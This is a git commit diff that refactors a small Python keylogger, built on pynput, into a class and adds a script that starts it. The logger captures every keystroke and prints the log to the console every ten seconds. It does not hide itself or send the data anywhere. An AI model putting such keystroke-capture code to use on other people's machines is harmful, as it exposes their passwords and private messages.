9250fe92f0570eb864976342471fdf3e7d7cfb17
David H <davhernandez17@gmail.com>
2020-04-13 23:14:14 -0400

    added Keylogger class & zlogger inmplementation

--- keylogger/keylogger.py
+++ keylogger/keylogger.py
@@ -5,26 +5,33 @@ import threading
 
 log = ''
 
-def process_key_press(key):
-    global log
-    try:
-        log = log + str(key.char)
-    except AttributeError :
-        if key == key.space:
-            log = log + " "
-        else:
-            log = " " + log + str(key) + " "
+class keylogger:
 
-def report():
-    global log
-    print(log)
-    log = ""
-    timer = threading.Timer(10,report)
-    timer.start()
+    def __init__(self):
+        self.log = ""
 
-keyboard_listener = pynput.keyboard.Listener(on_press = process_key_press)
+    def append_log(self,string):
+        self.log = self.log + string
 
-with keyboard_listener:
-    report()
-    keyboard_listener.join()
+    def process_key_press(self, key):
+        try:
+            current_key = str(key.char)
+        except AttributeError :
+            if key == key.space:
+                current_key = " "
+            else:
+                current_key = " " + str(key) + " "
+        self.append_log(current_key)
+
+    def report(self):
+        print(self.log)
+        self.log = ""
+        timer = threading.Timer(10, self.report)
+        timer.start()
+
+    def start(self):
+        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
+        with keyboard_listener:
+            self.report()
+            keyboard_listener.join()
 
---
+++ keylogger/zkeylogger.py
@@ -0,0 +1,6 @@
+#! usr/bin/env/python
+
+import  keylogger
+
+my_keylogger = keylogger.keylogger()
+my_keylogger.start()
